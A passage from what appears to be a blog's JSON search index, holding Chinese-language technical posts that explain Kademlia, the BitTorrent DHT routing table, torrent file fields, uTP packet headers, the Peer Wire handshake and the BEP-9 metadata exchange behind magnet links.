因子。\n\t\n\t当需要路由到某个“子树”，会从该子树对应的“K桶”中挑选【α 个节点】，然后对这几个节点【同时】发出请求。这么做有啥好处捏？俺在本文末尾聊“性能”和“安全性”时会具体介绍。\n\t\n+ 节点的加入\n\t\n\t- 任何一个新来的节点（假设叫 A），需要先跟 DHT 中已有的任一节点（假设叫 B）建立连接。\n\t- A 随机生成一个散列值作为自己的 ID（对于足够大的散列值空间，ID 相同的概率忽略不计）\n\t- A 向 B 发起一个查询请求（协议类型 FIND_NODE），请求的 ID 是自己（通俗地说，就是查询自己）\n\t- B 收到该请求之后，（如前面所说）会先把 A 的 ID 加入自己的某个 K 桶中。然后，根据 FIND_NODE 协议的约定，B 会找到【K个】最接近 A 的节点，并返回给 A。（B 怎么知道哪些节点接近 A 捏？这时候，【用 XOR 表示距离】的算法就发挥作用啦）\n\t- A 收到这 K 个节点的 ID 之后，（仅仅根据这批 ID 的值）就可以开始初始化自己的 K 桶。\n\t- 然后 A 会继续向刚刚拿到的这批节点发送查询请求（协议类型 FIND_NODE），如此往复（递归），直至 A 建立了足够详细的路由表。\n\n+ 节点的退出\n\t\n\t与 Chord 不同，Kad 对于节点退出没有额外的要求（没有“主动退出”的说法）。\n　　所以，Kad 的节点想离开 DHT 网络不需要任何操作（套用徐志摩的名言：悄悄的我走了，正如我悄悄的来）\n\n\n\n### 5. 参考资料\n\n+ https://colobu.com/2018/03/26/distributed-hash-table/\n+ https://program-think.blogspot.com/2017/09/Introduction-DHT-Kademlia-Chord.html\n\n","tags":["dht"],"categories":["bittorrent"]},{"title":"Kademlia_DHT_KRPC_BitTorrent协议(二)","url":"%2Fp%2F8dc4df20.html","content":"\n\n# 4. BitTorrent协议\n\nBitTorrent 使用\"分布式哈希表\"(DHT)来为无 tracker 的种子(torrents)存储 peer 之间的联系信息。这样每个 peer 都成了 tracker。这个协议基于 Kademila 网络并且在 UDP 上实现。\n\n<!-- more -->\n\n\n```\n1. \"peer\" 是在一个 TCP 端口上监听的客户端/服务器，它实现了 BitTorrent 协议 \n2. \"节点\" 是在一个 UDP 端口上监听的客户端/服务器，它实现了 DHT(分布式哈希表) 协议 \nDHT 由节点组成，它存储了 peer 的位置。BitTorrent 客户端包含一个 DHT 节点，这个节点用来联系 DHT 中其他节点，从而得到 peer 的位置，进而通过 BitTorrent 协议下载 \n```\n\n\n每个节点有一个全局唯一的标识符，作为 \"node ID\"。节点 ID 是一个随机选择的 160bit(20字节) 空间，BitTorrent infohash 也使用这样的 160bit 空间。\"距离\"用来比较两个节点 ID 之间或者节点 ID 和 infohash 之间的\"远近\"(节点和节点、节点和文件之间的距离)。节点必须维护一个路由表，路由表中含有一部分其它节点的联系信息。其它节点距离自己越近时，路由表信息越详细。因此每个节点都知道 DHT 中离自己很\"近\"的节点的联系信息，而离自己非常远的 ID 的联系信息却知道的很少 \n在 Kademlia 网络中，距离是通过异或(XOR)计算的，结果为无符号整数。distance(A, B) = |A xor B|，值越小表示越近\n\n\n\n1. 当节点要为 torrent(种子文件) 寻找 peer(保存了目标资源的IP) 时，它将自己路由表中的节点 ID 和 torrent 的 infohash(资源HASH) 进行\"距离对比\"(节点和目标文件的距离)，然后向路由表中离 infohash 最近的节点发送请求，问它们正在下载这个 torrent 的 peer 的联系信息\n\n2. 因为资源HASH和节点HASH都共用一套20bytes的命名空间，所以DHT节点充当了peer节点的\"代理\"的工作，我们不能直接向peer节点发起资源获取请求(即使这个peer节点确实存储了我们的目标资源)，因为peer节点本身不具备处理P2P request/response能力的，我们需要借助DHT的能力，让DHT告诉我们哪个peer节点保存了我们想要的资源或者哪个DHT节点可能知道从而递归地继续去问那个DHT网络\n\n3. 如果一个被联系的节点知道下载这个 torrent 的 peer 信息，那个 peer 的联系信息将被回复给当前节点。否则，那个被联系的节点则必须回复在它的路由表中离该 torrent 的 infohash 最近的节点的联系信息，(`get_peers`)\n\n4. 最初的节点重复地请求比目标 infohash 更近的节点，直到不能再找到更近的节点为止\n\n5. 查询完了之后，客户端把自己作为一个 peer 插入到所有回复节点中离种子最近的那个节点中，这一步背后的含义是: 我之前是请求这个资源的人，我们现在获取到资源了，我在下载这个文件的同时，我也要充当一个新的peer来向其他的客户端贡献自己的文件共享，这样，当另外的其他客户端在发起新的请求的时候，DHT节点就有可能把当前客户端对应的peer返回给新的请求方，这样不断发展下去，这个资源的热度就越来越热，下载速度也越来越快(`announce_peer`)\n\n6. 请求 peer 的返回值包含一个不透明的值，称之为\"令牌(token)\"\n\n7. 如果一个节点宣布它所控制的 peer 正在下载一个种子(即该节点拥有该文件资源)，它必须在回复请求节点的同时，附加上对方向我们发送的最近的\"令牌(token)\"。这样当一个节点试图\"宣布\"正在下载一个种子时，被请求的节点核对令牌和发出请求的节点的 IP 地址。这是为了防止恶意的主机登记其它主机的种子。由于令牌仅仅由请求节点返回给收到令牌的同一个节点，所以没有规定他的具体实现。但是令牌必须在一个规定的时间内被接受，超时后令牌则失效。在 BitTorrent 的实现中，token 是在 IP 地址后面连接一个 secret(通常是一个随机数)，这个 secret 每五分钟改变一次，其中 token 在十分钟以内是可接受的\n\n\n这种握手验证的原理是:\n\n> 请求方生成一个随机值，跟着我的请求发给被请求方，被请求方回复的时候要带上这个随机值，那请求方就知道，你是我刚才想请求的那个人\n\n### 0x1: 路由表 Routing Table\n\n\n1. 每个节点维护一个路由表保存已知的好节点。路由表中的节点是用来作为在 DHT 中请求的起始点。路由表中的节点是在不断的向其他节点请求过程中，对方节点回复的。即DHT中的K桶中的节点，当我们请求一个目标资源的时候，我们根据HASH XOR从自己的K桶中选择最有可能知道该资源的节点发起请求，而被请求的节点也不一定知道目标资源所在的peer，这个时候被请求方会返回一个新的\"它认为可能知道这个peer的节点\"，请求方收到这个新的节点后，会把这个节点保存进自己的K桶内，然后继续发起请求，直到找到目标资源所在的peer为止\n\n2. 并不是我们在请求过程中收到的节点都是平等的，有的节点是好的，而另一些则不是。许多使用 DHT 协议的节点都可以发送请求并接收回复，但是不能主动回复其他节点的请求，这种节点被称之为\"坏节点\"\n\n3. 节点的路由表只包含已知的好节点，这很重要。好节点是指在过去的 15 分钟以内，曾经对我们的某一个请求给出过回复的节点(存活好节点)，或者曾经对我们的请求给出过一个回复(不用在15分钟以内)，并且在过去的 15 分钟给我们发送过请求。上述两种情况都可将节点视为好节点。在 15 分钟之后，对方没有上述 2种情况发生，这个节点将变为可疑的。当节点不能给我们的一系列请求给出回复时，这个节点将变为坏的。相比那些未知状态的节点，已知的好节点会被给于更高的优先级。(看源码确实是这样的)\n\n\t> 这就反过来告诉我们，如果我们要做DHT嗅探，我们的嗅探器除了要能够发出FIND_NODE请求及接收返回之外，还需要能够响应其他节点发来的请求(`get_peers/announce_peer`)，这样才不会被其他节点列入\"可疑\"甚至\"坏节点\"列表中\n\n4. 路由表覆盖从 0 到 2^160 全部的节点 ID 空间。路由表又被划分为桶(bucket)，每个桶包含一部分的 ID 空间。空的路由表只有一个桶，它的 ID 范围从 min=0 到 max=2^160。当 ID 为 N 的节点插入到表中时，它将被放到 ID 范围在 min <= N < max 的 桶 中\n\n5. 空的路由表只有一个桶，所以所有的节点都将被放到这个桶中。每个桶最多只能保存 K 个节点，当前 K=8。当一个桶放满了好节点之后，将不再允许新的节点加入，除非我们自身的节点 ID 在这个桶的范围内。在这样的情况下，这个桶将被分裂为 2 个新的桶，每个新桶的范围都是原来旧桶的一半。原来旧桶中的节点将被重新分配到这两个新的桶中。如果一个新表只有一个桶，这个包含整个范围的桶将总被分裂为 2 个新的桶，每个桶的覆盖范围从 0..2^159 和 2^159..2^160  以log2N的方式不断分裂，类似于Kademlia中的K桶机制\n\n6. 当桶装满了好节点，新的节点会被丢弃。一旦桶中的某个节点变为了坏的节点，那么我们就用新的节点来替换这个坏的节点。如果桶中有在 15 分钟内都没有活跃过的节点，我们将这样的节点视为可疑的节点，这时我们向最久没有联系的节点发送 ping。如果被 ping 的节点给出了回复，那么我们向下一个可疑的节点发送 ping，不断这样循环下去，直到有某一个节点没有给出 ping 的回复，或者当前桶中的所有节点都是好的(也就是所有节点都不是可疑节点，他们在过去 15 分钟内都有活动)。如果桶中的某个节点没有对我们的 ping 给出回复，我们最好再试一次(再发送一次 ping，因为这个节点也许仍然是活跃的，但由于网络拥塞，所以发生了丢包现象，注意 DHT 的包都是 UDP 的)，而不是立即丢弃这个节点或者直接用新节点来替代它。这样，我们得路由表将充满稳定的长时间在线的节点 \n\n7. 每个桶都应该维持一个 lastchange 字段来表明桶中节点的\"新鲜\"度。当桶中的节点被 ping 并给出了回复，或者一个节点被加入到了桶，或者一个节点被新的节点所替代，桶的 lastchange 字段都应当被更新。如果一个桶的 lastchange 在过去的 15 分钟内都没有变化，那么我们将更新它。这个更新桶操作是这样完成的\n\n\t+ 从这个桶所覆盖的范围中随机选择一个 ID，并对这个 ID 执行 find_nodes 查找操作。\n\t+ 常常收到请求的节点通常不需要常常更新自己的桶, 反之，不常常收到请求的节点常常需要周期性的执行更新所有桶的操作，这样才能保证当我们用到 DHT 的时候，里面有足够多的好的节点 \n\n8. 在插入第一个节点到路由表并启动服务后，这个节点应试着查找 DHT 中离自己更近的节点，这个查找工作是通过不断的发出 find_node 消息给越来越近的节点来完成的，当不能找到更近的节点时，这个扩散工作就结束了\n\n9. 路由表应当被启动工作和客户端软件保存(也就是启动的时候从客户端中读取路由表信息，结束的时候客户端软件记录到文件中)\n\n\n### 0x2: BitTorrent 协议扩展 BitTorrent Protocol Extension\n\n\nBitTorrent 协议已经被扩展为可以在通过 tracker 得到的 peer 之间互相交换节点的 UDP 端口号(也就是告诉对方我们的 DHT 服务端口号)，在这样的方式下，客户端可以通过下载普通的种子文件来自动扩展 DHT 路由表(我直接知道某个节点有某一个资源)。新安装的客户端第一次试着下载一个无 tracker 的种子时，它的路由表中将没有任何节点，这是它需要在 torrent 文件中找到联系信息\n\n\n1. peers 如果支持 DHT 协议就将 BitTorrent 协议握手消息的保留位的第 8 字节的最后一位置为 1\n2. 这时如果 peer 收到一个 handshake 表明对方支持 DHT 协议，就应该发送 PORT 消息。它由字节 0x09 开始，payload 的长度是 2 个字节，包含了这个 peer 的 DHT 服务使用的网络字节序的 UDP 端口号\n3. 当 peer 收到这样的消息时应当向对方的 IP 和消息中指定的端口号的节点发送 ping\n4. 如果收到了 ping 的回复，那么应当使用上述的方法将新节点的联系信息加入到路由表中 \n\n### 0x3: Torrent 文件扩展 Torrent File Extensions(种子文件)\n\n一个无 tracker 的 torrent 文件字典不包含 announce 关键字，而使用 nodes 关键字来替代。这个关键字对应的内容应该设置为 torrent 创建者的路由表中 K 个最接近的节点(可供选择的)，这个关键字也可以设置为一个已知的可用节点(这意味着接收到这个种子文件的客户端能够向这些节点发出解析请求，询问资源的所在位置)，比如这个 torrent 文件的创建者.\n\n请不要自动加入 router.bittorrent.com 到 torrent 文件中或者自动加入这个节点到客户端路由表中。这里可以仔细思考一下，这么做还有另一个好处，这个对等网络可以保持无中心化，对于外部新加入的新节点来说，它可以不用通过\"中心引导节点\"来加入网络，隐藏了\"中心引导节点\"的存在，增强了对等网络的隐蔽性\n\n\nbt 种子文件是使用 bencode 编码的，整个文件就 dictionary，包含以下键\n\n```\n1. info(dictinary): 必选, 表示该bt种子文件的文件信息 \n    1) 文件信息包括文件的公共部分\n        1.1) piece length(integer): 必选, 每一数据块的长度\n        1.2) pieces(string): 必选, 所有数据块的 SHA1 校验值\n        1.3) publisher(string):    可选, 发布者\n        1.4) publisher.utf-8(string): 可选, 发布者的 UTF-8 编码\n        1.5) publisher-url(string): 可选, 发布者的 URL\n        1.6) publisher-url.utf-8(string): 可选, 发布者的 URL 的 UTF-8 编码\n    2) 如果 bt 种子包含的是单个文件，包含以下内容\n        2.1) name(string): 必选, 推荐的文件名称\n        2.2) name.utf-8(string): 可选, 推荐的文件名称的 UTF-8 编码\n        2.3) length(int): 必选，文件的长度单位是字节\n    3) 如果是多文件，则包含以下部分:\n        3.1) name(string): 必选, 推荐的文件夹名称\n        3.2) name.utf-8(string): 可选, 推荐的文件名称的 UTF-8 编码\n        3.3) files(list): 必选, 文件列表，每个文件列表下面是包括每一个文件的信息，文件信息是个字典 \n    4) 文件字典\n        4.1) length(int): 必选，文件的长度单位是字节\n        4.2) path(string): 必选，文件名称，包含文件夹在内\n        4.3) path.utf-8(string): 必选，文件名称 UTF-8 表示，包含文件夹在内\n        4.4) filehas(string): 可选，文件hash\n        4.5) ed2k(string): 可选, ed2k 信息 \n\n2. announce(string): 必选, tracker 服务器的地址\n3. announce-list(list): 可选, 可选的 tracker 服务器地址\n4. creation date(interger): 必选, 文件创建时间\n5. comment(string): 可选, bt 文件注释\n6. created by(string): 可选，文件创建者\n```\n\n<font color=\"red\">pieces是一个字符串，它的长度是20的倍数，每一段20个字符表示对应文件块的sha1 hash值。</font>\n\n\n\n\n这里要特别注意一点：磁力链接的infohash也是根据info字段来计算的，info字段的pieces为每个数据块的校验值，其作用是验证下载下来的文件是否正确，如果下载下来的文件块计算出来的SHA1值和pieces中的SHA1校验值不一致，该数据块要重新下载。 所以，我们可以看出根据磁力链接下载文件是分成两个步骤的\n\n1. 先根据infohash下载种子文件的info字段，种子文件并不是必须的，但是info字段却必不可少\n2. 然后根据infohash下载源文件，将下载的每一个数据块和info中的对应的SHA1校验码进行比较，不一致重新下载该数据块\n\n需要注意的是\n\n1. 一般的种子文件会包含announce，也就是tracker服务器的地址(trackerless是BTTorrent的趋势)\n2. 如果没有tracker服务器，文件中可能会包含nodes，nodes是存有种子信息的peer节点，这样的种子文件就是trackerless torrent。如果有nodes客户端直接从nodes获取种子信息\n3. <font color=\"red\">而从DHT网络中下载下来的种子文件既没有annouce也没有nodes，客户端只能通过info字段计算出hashinfo，再从bootstrap node节点开始在DHT网络中寻找种子信息</font>\n\n\nBT原生依靠Tracker，后来才加入dht\n\n\n\n\n# 5. uTP协议 \n\nuTP协议是一个基于UDP的开放的BT点对点文件共享协议。在uTP协议出现之前，BT下载会占用网络中大量的链接，直接导致其它网络应用服务质量下载和网络的拥堵，因此有很多ISP都开始限制BT的下载。uTP减轻了网络延迟并解决了传统的基于TCP的BT协议所遇到的拥塞控制问题，提供可靠的有序的传送。\n\n\n\n一个有效的uTP数据包包含下面格式的报头\n\n![1](Kademlia_DHT_KRPC_BitTorrent协议2/1.png)\n\n\n1. type(包类型):\n\n\t```\n    1) ST_DATA = 0: 最重要的数据包，uTP就是使用该类型的包传送数据\n    2) ST_FIN = 1: 关闭连接，这是uTP连接的最后一个包，类似于TCP中的FIN\n    3) ST_STATE = 2: 简单的应答包，表明已从对方收到了数据包，该包不包含任何数据，seq_nr值不变\n    4) ST_RESET = 3: 终止连接，类似于TCP中的RST\n    5) ST_SYN = 4: 初始化连接，类似于TCP中的SYN，这是uTP连接的第一个包\n\t```\n2. ver: This is the protocol version. The current version is 1.\n3. extension: The type of the first extension in a linked list of extension headers. \n  \n    ```\n    1) 0 means no extension.\n    2) Selective acks: There is currently one extension:\n\t```\n\n4. `connection_id`: This is a random, unique, number identifying all the packets that belong to the same connection. Each socket has one connection ID for sending packets and a different connection ID for receiving packets. The endpoint initiating the connection decides which ID to use, and the return path has the same ID + 1.    \n\n\tuTP的一个很重要的特点是使用connection id来标识一次连接，而不是每个包算一次连接。所以在分析ST_DATA时，需要注意找所有connection id相同的数据包，然后按seq_nr排序，seq_nr应该是依次递增的(注意ST_STATE包不会增加seq_nr值)，如果发现两个ST_DATA的seq_nr值相同则说明后面那个报文是重复报文需要忽略掉，如果发现两个ST_DATA的seq_nr值不是连续的，中间差了一个或多个，则可能是由于网络原因发生了丢包现象，数据包将不可用\n\n5. `timestamp_microseconds`: This is the 'microseconds' parts of the timestamp of when this packet was sent. This is set using gettimeofday() on posix and QueryPerformanceTimer() on windows. The higher resolution this timestamp has, the better. The closer to the actual transmit time it is set, the better.\n\n6. `timestamp_difference_microseconds`: This is the difference between the local time and the timestamp in the last received packet, at the time the last packet was received. This is the latest one-way delay measurement of the link from the remote peer to the local machine. \nWhen a socket is newly opened and doesn't have any delay samples yet, this must be set to 0.\n\n7. wnd_size: Advertised receive window. This is 32 bits wide and specified in bytes. The window size is the number of bytes currently in-flight, i.e. sent but not acked. The advertised receive window lets the other end cap the window size if it cannot receive any faster, if its receive buffer is filling up. When sending packets, this should be set to the number of bytes left in the socket's receive buffer.\n\n8. seq_nr\n9. ack_nr\n\n在uTP连接建立之后，就开始传送需要的数据了。peer和peer之间传送数据也是遵循着一定的规范，就是Peer Wire协议。\n\n\n# 6. Peer Wire协议 \n\n在BitTorrent中，节点的寻址是通过DHT实现的，而实际的资源共享和传输则需要通过uTP以及Peer Wire协议来配合完成\n\n### 0x1: 握手\n\nPeer Wire协议是Peer之间的通信协议，通常由一个握手消息开始。握手消息的格式是这样的\n\n```\n<pstrlen><pstr><reserved><info_hash><peer_id> \n```\n\n在BitTorrent协议的v1.0版本, pstrlen = 19, pstr = \"BitTorrent protocol\"，info_hash是上文中提到的磁力链接中的btih，peer_id每个客户端都不一样，但是有着一定的规则，根据前面几个字符可以推断出客户端的类型\n\n```\n'AG' - Ares\n'A~' - Ares\n'AR' - Arctic\n'AV' - Avicora\n'AX' - BitPump\n'AZ' - Azureus\n'BB' - BitBuddy\n'BC' - BitComet\n'BF' - Bitflu\n'BG' - BTG (uses Rasterbar libtorrent)\n'BR' - BitRocket\n'BS' - BTSlave\n'BX' - ~Bittorrent X\n'CD' - Enhanced CTorrent\n'CT' - CTorrent\n'DE' - DelugeTorrent\n'DP' - Propagate Data Client\n'EB' - EBit\n'ES' - electric sheep\n'FT' - FoxTorrent\n'FX' - Freebox BitTorrent\n'GS' - GSTorrent\n'HL' - Halite\n'HN' - Hydranode\n'KG' - KGet\n'KT' - KTorrent\n'LH' - LH-ABC\n'LP' - Lphant\n'LT' - libtorrent\n'lt' - libTorrent\n'LW' - LimeWire\n'MO' - MonoTorrent\n'MP' - MooPolice\n'MR' - Miro\n'MT' - MoonlightTorrent\n'NX' - Net Transport\n'PD' - Pando\n'qB' - qBittorrent\n'QD' - QQDownload\n'QT' - Qt 4 Torrent example\n'RT' - Retriever\n'S~' - Shareaza alpha/beta\n'SB' - ~Swiftbit\n'SS' - SwarmScope\n'ST' - SymTorrent\n'st' - sharktorrent\n'SZ' - Shareaza\n'TN' - TorrentDotNET\n'TR' - Transmission\n'TS' - Torrentstorm\n'TT' - TuoTu\n'UL' - uLeecher!\n'UT' - µTorrent\n'VG' - Vagaa\n'WD' - WebTorrent Desktop\n'WT' - BitLet\n'WW' - WebTorrent\n'WY' - FireTorrent\n'XL' - Xunlei\n'XT' - XanTorrent\n'XX' - Xtorrent\n'ZT' - ZipTorrent\n```\n\nPeer Wire协议是在uTP协议基础上里层应用态协议。收到握手消息后，对方也会回复一个握手消息，并且开始协商一些基本的信息。\n\n\n\n# 7. BitTorrent协议扩展\n\nBitTorrent协议扩展与 ut_metadata和ut_pex(Extension for Peers to Send Metadata Files) (磁力链接核心)\n\n```\nBEP:9 \t\tTitle:\tExtension for Peers to Send Metadata Files\nBEP:10 \t\tTitle:\tExtension Protocol\n```\n\n\n借助于DHT/KRPC完成了的Node节点寻址，资源对应的Peer获取，以及uTP以及Peer Wire完成握手之后，接下要就要\"动真格\"了，我们需要获取到目标资源的\"种子信息(infohash/filename/pieces分块sha1)\"了，<font color=\"red\">这个扩展的目的是为了在最初没有.torrent文件的情况仍然能够加入swarm并能够完成下载。这个扩展能让客户端从peer哪里下载metadata。这让支持magnet link成为了可能，magnet link是一个web页上的链接，仅仅包含了足够加入swarm的足够信息(info hash)</font>\n\n\n### 0x1: Metadata\n\n这个扩展仅仅传输.torrent文件的info-字典字段，这个部分可以由infohash来验证。在这篇文档中，.torrent的这个部分被称为metadata。\n\nMetadata被分块，每个块有16KB(16384字节)，Metadata块从0开始索引，所有快的大小都是16KB，除了最后一个块可能比16KB小\n\n\n### 0x2: Extension头部\n\nMetadata扩展使用extension协议(<font color=\"green\">__BEP0010__</font>)来声称它的存在。它在extension握手消息的头部m字典加入ut_metadata项。它标识了这个消息可以使用这个消息码，同时也可以在握手消息中加入metadata_size这个整型字段(不是在m字典中)来指定metadata的字节数\n\n```\n{'m': {'ut_metadata', 3}, 'metadata_size': 31235}\n```\n\n### 0x3: Extension消息\n\nExtension消息都是bencode编码，这里有3类不同的消息\n\n\n+ request 0: \n\n请求消息并不在字典中附加任何关键字，这个消息的回复应当来自支持这个扩展的peer，是一个reject或者data消息，回复必须和请求所指出的片相同\nPeer必须保证它所发送的每个片都通过了infohash的检测。即直到peer获得了整个metadata并通过了infohash的验证，才能够发送片(即一个peer应该保证自己已经完整从其他peer中拷贝了一份相同的资源文件后，才能继续响应其他节点的拷贝请求)。Peers没有获得整个metadata时，对收到的所有metadata请求都必须直接回复reject消息\n\n```\n{'msg_type': 0, 'piece': 0}\nd8:msg_typei0e5:piecei0ee\n# 这代表请求消息在请求metadata的第一片\n```\n\n+ data 1\n\n这个data消息需要在字典中添加一个新的字段，\"total_size\".这个关键字段和extension头的\"metadata_size\"有相同的含义，这是一个整型\n\nMetadata片被添加到bencode字典后面，他不是字典的一部分，但是是消息的一部分(必须包括长度前缀)。\n如果这个片是metadata的最后一个片，他可能小于16KB。如果它不是metadata的最后一片，那大小必须是16KB\n\n```\n{'msg_type': 1, 'piece': 0, 'total_size': 3425}\nd8:msg_typei1e5:piecei0e10:total_sizei34256eexxxxxxxx...\n# x表示二进制数据(metadata) \n```\n\n+ reject 2\n\nReject消息没有附件的关键字。它的意思是peer没有请求的这个metadata片信息 \n\n在客户端收到收到一定数目的消息后，可以通过拒绝请求消息来进行洪泛攻击保护。尤其在metadata的数目乘上一个因子时 \n\n```\n{'msg_type': 2, 'piece': 0}\nd8:msg_typei1e5:piecei0ee\n```\n\n### 0x4: request消息: Metadat信息获取过程\n\n+ 扩展支持交互(互相询问对方支持哪些扩展)\n\n根据BEP-010我们知道，扩展消息一般在Peer Wire握手之后立即发出，是一个B编码的字典\n\n```\n{\n    e: 0,\n    ipv4: xxx,\n    ipv6: xxx,\n    complete_ago: 1,\n    m:\n    {\n        upload_only: 3,\n        lt_donthave: 7,\n        ut_holepunch: 4,\n        ut_metadata: 2,\n        ut_pex: 1,\n        ut_comment: 6\n    },\n    matadata_size: 45377,\n    p: 33733,\n    reqq: 255,\n    v: BitTorrent 7.9.3\n    yp: 19616,\n    yourip: xxx\n}\n\n1. m: 是一个字典，表示客户端支持的所有扩展以及每个扩展的编号\n    1) ut_pex: 表示该客户端支持PEX(Peer Exchange)\n    2) ut_metadata表示支持BEP-009(也就是交换种子文件的metadata)\n```\n\n+ 握手handshake\n\n\n我们在完成双方握手之后，并且得到了对方支持的扩展信息。资源请求方也通知被请求方本机支持的扩展情况，然后后面接着一个扩展消息(从上面的m字典可以看到可能会有多种不同的扩展消息)，具体是哪个类型的扩展消息由message ID后面那个数字决定，这个数字对应着m字典中的编号。譬如我们这里的消息是\n\n```\n00 00 00 1b 14 02 ... 00 00 00 1b \n1. 消息长度为 0x1b (27 bytes) \n2. 14 表示是 扩展消息(0x14 = 20)\n3. 02 对应上面m字典中的 ut_metadata，所以我们这个消息是ut_metadata消息\n```\n\n\n再次看上图的截图，我们这里的图显示的是[msg_type: 0, piece: 2]正是request消息，意思是向对象请求第二个piece的数据，piece的意思是分块的意思，根据BEP-009我们知道，种子文件的metadata（也就是info部分）会按16KB分成若干块，除最后一块每一块的大小都是16KB，每一块从0开始按顺序进行编号。所以这个请求的意思就是向对象请求第三块的metadata\n\n\n\n+ 回复data信息\n\n\n从图中形象的表示可以看到torrent文件整个info的长度为45377，这个值正是上面握手报文后的扩展消息中的metadata_size的值。在发送request消息之后，接下来对方应该回复data消息（如果对方有数据）或reject消息（如果对方没有数据）。\n\n\nmsg_type为1表示是回复就是我所需要的数据，但是注意这里的数据并没完，由于uTP协议的缘故，我们可以根据connection id找到这个连接后续的所有数据。 这里其实一共收到了三个消息，我们分别来看一下\n\n```\n00 00 00 03 09 83 c5 --> message ID为9，port消息，表示端口号为0x83c5 = 33733\n00 00 00 03 14 03 01 --> message ID为20(0x14)，extend消息，编号03为upload_only，表示设置upload_only = 1\n00 00 31 70 14 02 xx --> message ID为20(0x14)，extend消息，编号02为ut_metadata，后面的xx表示[msg_type: 1, piece: 2, total_size: 45377]和相应块的metadata数据\n```\n\n\n看第三个消息可以知道消息长度为0x3170，这个长度包括了[msg_type...]这一串字符串的长度，共0x2f个字节，我们将其减去就得到了piece2的长度：0x3170 - 0x2f = 0x3141 我们上面说过每个块的大小应该是16KB，也就是0x4000，这里的大小为0x3141，只可能是最后一块。我们稍微计算验证下，将整个info的长度45377(0xb141)按16KB分块\n\n```\npiece 0: 0x0001 ~ 0x4000 长度0x4000\npiece 1: 0x4001 ~ 0x8000 长度0x4000\npiece 2: 0x8001 ~ 0xb141 长度0x3141\n```\n\n\n可以看到piece2正是最后一块，大小为0x3141。至此我们得到了第二块的metadata，然后通过request消息获取piece0和piece1获取第一和第二块的metadata，将三块的消息合并成torrent文件info字段，然后再加上create date、create by或comment等信息，种子文件就算完成下载了。<font color=\"red\">可见要在BT网络中完成实际的资源下载，就必须完整获取到种子文件，因为种子文件中不单有infohash值，还有piece sha1校验码，分块下载时需要进行校验，而磁力连接magnet只是一个最小化入口，最终还是需要通过磁力连接在DHT网络中获取种子文件的完整信息</font>\n\n\n\n### 0x5: 校验info_hash\n\n我们将从DHT网络中下载的种子文件和原始的种子文件进行比较，可以看到annouce和annouce-list字段都丢掉了(引入了DHT网络后，BT可以实现Trackerless)，create date发生了变化，info字段不变\n\n磁力链是为了简化BT种子文件的分发，封装了一个简化版的magnet url，客户端解析这个magnet磁力链之后，需要在DHT网络中寻找infohash对应的peer节点，获取节点成功后，向目标peer节点获取真正的BitTorrent种子(.torrent文件)信息(包含了完整的pieces SHA1杂凑信息)，另一个渠道就是传统的Bt种子论坛会分发.BT种子文件\n\n\n\n# 8. 参考资料\n\n+ https://www.cnblogs.com/LittleHann/p/6180296.html","tags":["dht"],"categories":["bittorrent"]},{"title":"Kademlia_DHT_KRPC_BitTorrent协议(一)","url":"%2Fp%2F22f54442.html","content":"\n# 1.引言\n\n平常我们高端用户都会用到BT工具来分享一些好玩的资源，例如ubuntu 13.04的ISO安装盘，一些好听的音乐等。这个时候我们会进入一个叫做P2P的网络，大家都在这个网络里互相传递数据，这种分布式的数据传输解决了HTTP、FTP等单一服务器的带宽压力。以往的BT工具（包括现在也有）在加入这个P2P网络的时候都需要借助一个叫Tracker的中心服务器，这个服务器是用来登记有哪些用户在请求哪些资源，然后让请求同一个资源的用户都集中在一起互相分享数据，形成的一个集群叫做Swarm。\n\n<!-- more -->\n\n这种工作方式有一个弊端就是一旦Tracker服务器出现故障或者线路遭到屏蔽，BT工具就无法正常工作了。所以聪明的人类后来发明了一种叫做DHT（Distributed Hash Table）的去中心化网络。每个加入这个DHT网络的人都要负责存储这个网络里的资源信息和其他成员的联系信息，相当于所有人一起构成了一个庞大的分布式存储数据库。在DHT里定位一个用户和定位一个资源的方法是一样的，他们都使用SHA－1产生的哈希值来作标识。\n\n\n### 0x1: Kademlia/DHT/KRPC/BitTorrent之间的关系\n\nKademlia是一个最初提出的框架和理论基础，P2P对等资源共享的思想从这里开始衍生，DHT和KRPC是在Kademlia的基础上进行了包装和发展，BitTorrent是在这三者之上的文件共享分发协议。\n\n### 0x2: Magnet URI格式\n\n```\nmagnet:?xt=urn:btih:<info-hash>&dn=<name>&tr=<tracker-url>\n\n1. <info-hash>: Infohash的16进制编码，共40字符。为了与其它的编码兼容，客户端应当也支持32字符的infohash base32编码 \n2. Xt是唯一强制的参数\n3. dn是在等待metadata时可能供客户端显示的名字\n4. 如果只有一个字段，Tr是tracker的url，如果有很多的tracker，那么多个tr字段会被包含进去 \n# dn和tr都是可选的 \n```\n如果没有指定tracker，客户端应使用DHT来获取peers\n\n\n### 0x3:P2P的含义\n\n从第一个P2P应用系统Napster的出现开始，P2P技术掀起的风暴为互联网带来了一场空前的变革。P2P不是一个全新的概念，P2P理念的起源可以追溯到20世纪80年代。目前，在学术界、工业界对于P2P没有一个统一的定义。Peer在英语里有“(地位、能力等)同等者”、“同事”和“伙伴”等意义，这样一来，P2P也就可以理解为“伙伴对伙伴”的意思，或称为对等网 \n\n严格地定义纯粹的P2P网络，它是指完全分布的系统，每一个节点都是在功能上和任务上完全相同的。但是这样的定义就会排除掉一些使用“超级节点”的系统或者一些使用中央服务器做一些非核心任务的系统。广义的定义里面指出P2P是一种能善于利用互联网上的存储、CPU周期、内容和用户活动等各种资源的一类应用程序[3]，包括了一些依赖中央服务器才能工作的系统 \n\nP2P这个定义并不是从系统的结构或者内部的操作特征出发考虑的，而是从人们外在的感知角度出发，如果一个系统从直观上看是各个计算机之间直接互相联系的就可以被叫做P2P。当前，技术上比较权威的定义为，P2P系统是一个由直接相连的节点们所构成的分布式的系统[4]，这些节点能够为了共享内容、CPU 时间、存储或者带宽等资源而自我形成一定的网络拓扑结构，能够在适应节点数目的变化和失效的同时维持可以接受的链接能力和性能，并且不需要一个全局服务器或者权威的中介的支持。本文从人们感知的角度出发，采用P2P的广义定义\n\n\n# 2. Kademlia协议\n\n### 0x1: Kademlia\n\nKademlia是一种通过分散式杂凑表实现的协议算法，它是由Petar和David为非集中式P2P计算机网络而设计的\n\n```\n1. Kademlia规定了网络的结构，也规定了通过节点查询进行信息交换的方式\n2. Kademlia网络节点之间使用UDP进行通讯\n3. 参与通讯的所有节点形成一张虚拟网(或者叫做覆盖网)。这些节点通过一组数字(或称为节点ID)来进行身份标识\n4. 节点ID不仅可以用来做身份标识，还可以用来进行值定位(值通常是文件的散列或者关键词)\n5. <font 